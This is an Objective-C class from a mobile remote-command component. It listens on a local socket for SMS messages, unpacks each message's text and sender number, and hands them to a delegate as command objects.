/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCommandReceiver
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  11/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SMSCmdReceiver.h"
#import "SocketIPCReader.h"
#import "DefStd.h"
#import "SMSCmd.h"

@implementation SMSCmdReceiver

@synthesize mDelegate;

/**
- Method name:init
- Purpose: This method is used to initialize the SMSCommandReceiver class.
- Argument list and description: No Argument
- Return type and description: self (SMSCommandReceiver instance)
*/

- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}
/**
 - Method name:startMonitoring
 - Purpose: This method is used for start operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) startMonitoring {
	mSocketReader = [[SocketIPCReader alloc] initWithPortNumber:kMSSmsReceiverSocketPort 
											 andAddress:kLocalHostIP 
											 withSocketDelegate:self];
	[mSocketReader start];
}

/**
 - Method name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) stopMonitoring {
	[mSocketReader stop];
	[mSocketReader release];
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
 */

- (void) dataDidReceivedFromSocket: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kSMSCommandKey] retain];
    [unarchiver finishDecoding];
    [unarchiver release];
    SMSCmd *command=[[SMSCmd alloc] init];
	[command setMMessage:[dictionary objectForKey:kSMSTextKey]];
	[command setMSenderNumber:[dictionary objectForKey:kSMSSenderKey]];
 	if (([[self mDelegate] respondsToSelector:@selector(didSMSCommandReceived:)])) {
		[[self mDelegate] performSelector:@selector(didSMSCommandReceived:) withObject:command];
	}
	 [command release];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	[super dealloc];
}

@end
